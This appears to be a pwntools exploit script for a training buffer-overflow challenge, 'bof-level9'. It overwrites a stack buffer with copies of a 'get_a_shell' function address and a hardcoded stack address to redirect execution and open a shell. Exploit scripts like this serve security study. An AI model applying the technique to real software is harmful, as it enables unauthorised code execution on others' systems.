#!/usr/bin/env python

import os
from pwn import *

def get_p():
    return process("./bof-level9")
    #return process("./bof-levelx")

elf = ELF("./bof-levelx")
shell = p64(elf.symbols["get_a_shell"])

context.terminal = ['tmux', 'splitw', '-v']

# delete core
#os.system("rm -f core")

# get crash
#p = get_p()
#payload = "a"*136+"\x00"
#p.sendline(payload)

#core = Core("./core")
#buf_base = core.stack.find(payload)
#log.info("buffer at {}".format(hex(buf_base)))

# shell
p = get_p()
#gdb.attach(p, 'b *main+102')
#payload = shell*(128/len(shell)) + "\x00"
buf_base = 0xffffd308
payload = ""
payload += shell
payload += shell
payload += "a"*(124-len(payload))
payload += p32(buf_base+4)
p.sendline(payload)
#p.sendline("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
p.interactive()

"""
buffer at 0xffffd308
ebp-0x4 -> ecx
*ecx -> esp
*esp -> eip

ecx gets data in buf+124
"""
